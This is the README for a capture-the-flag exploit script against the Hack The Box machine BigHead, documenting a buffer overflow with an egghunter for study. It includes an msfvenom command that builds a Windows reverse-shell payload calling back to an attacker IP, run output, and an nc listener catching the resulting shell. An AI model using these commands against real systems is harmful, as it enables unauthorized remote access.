## Challenge

[BigHead](https://www.hackthebox.eu/home/machines/profile/164) from Hackthebox.eu

## pwn_bighead.py

### Description

Performs a buffer overflow attack against `BigHeadWebSrv`. Script first submits POST requests to put shellcode into memory, and then points EIP to EggHunter code which looks for and executes that shellcode in memory. Script also handles shellcode generation using `msfvenom`, saving the shellcode as a python file and then importing it. The script will then clean up that file.

### Reference

Originally published in blog posts: [https://0xdf.gitlab.io/2019/05/04/htb-bighead-bof.html](https://0xdf.gitlab.io/2019/05/04/htb-bighead-bof.html).

### Dependencies

- python pwntools
- `msfvenom` in the current path

### Usage

```
root@kali# python pwn_bighead.py 
pwn_bighead.py [target] [target port] [callback ip] [callback port]

root@kali# python pwn_bighead.py 10.10.10.112 80 10.10.14.14 443
[*] Generating shellcode:
    msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.14 LPORT=443 EXIT_FUNC=THREAD -a x86 --platform windows -b "\x00\x0a\x0d" -f python -v shellcode -o sc.py
[+] Shellcode generated successfully
[*] Sending payload 5 times
[+] Opening connection to 10.10.10.112 on port 80: Done
[*] Closed connection to 10.10.10.112 port 80
[+] Opening connection to 10.10.10.112 on port 80: Done
[*] Closed connection to 10.10.10.112 port 80
[+] Opening connection to 10.10.10.112 on port 80: Done
[*] Closed connection to 10.10.10.112 port 80
[+] Opening connection to 10.10.10.112 on port 80: Done
[*] Closed connection to 10.10.10.112 port 80
[+] Opening connection to 10.10.10.112 on port 80: Done
[*] Closed connection to 10.10.10.112 port 80
[+] Payload sent.
[*] Sleeping 1 second.
[*] Sending overflow + egghunter.
[*] Expect callback in 0-15 minutes to 10.10.14.14:443.
[+] Opening connection to 10.10.10.112 on port 80: Done
```

```
root@kali:~/hackthebox/kryptos-10.10.10.129# nc -lnvp 443
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.112.
Ncat: Connection from 10.10.10.112:51390.
Microsoft Windows [Version 6.0.6002]
Copyright (c) 2006 Microsoft Corporation.  All rights reserved.

C:\nginx>whoami
whoami
piedpiper\nelson
```

